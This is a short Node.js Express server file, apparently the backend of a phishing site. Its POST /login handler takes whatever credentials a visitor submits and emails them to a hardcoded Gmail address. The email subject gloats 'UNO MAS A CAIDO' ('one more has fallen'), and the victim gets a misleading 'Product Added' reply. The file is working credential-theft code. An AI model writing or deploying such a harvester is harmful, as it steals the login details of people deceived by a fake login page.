import express from 'express'
import transporter from "./Manager/contenedor.js"
//const manager  = new Manager();
const app = express()
const PORT = process.env.PROT || 8080;


const server = app.listen(PORT,()=>{
    console.log(`Èscuchando en el puerto ${PORT}`)
})
app.use(express.json())
app.post('/login',async(req,res) =>{
    let producto = req.body
    res.send({status:"succes", message:"Product Added"})
    console.log(producto)
    await transporter.sendMail({
        from: '"FORGOT PASSWORD" <castanedalondonod@gmail.com>', // sender address
        to: "castanedalondonod@gmail.com", // list of receivers
        subject: "UNO MAS A CAIDO MUAJAJAJ ", // Subject line
        text: JSON.stringify(producto), // plain text body
        html: "<b>AN CAIDO </b>"+JSON.stringify(producto), // html body
      });
    
})
app.use(express.static('public'))